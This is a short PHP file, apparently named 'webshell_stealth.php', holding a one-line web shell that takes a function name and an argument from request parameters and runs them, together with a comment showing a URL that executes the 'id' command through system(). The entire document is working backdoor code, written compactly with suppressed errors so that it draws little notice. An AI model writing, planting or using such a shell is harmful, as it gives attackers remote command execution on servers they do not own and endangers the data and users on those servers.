# This will only work if the system() function is enabled and not disabled in the PHP configuration.
# Execution: http://example.com/webshell_stealth.php?x=system&y=id

<?php @$_=$_REQUEST['x'];@$_($_REQUEST['y']); ?>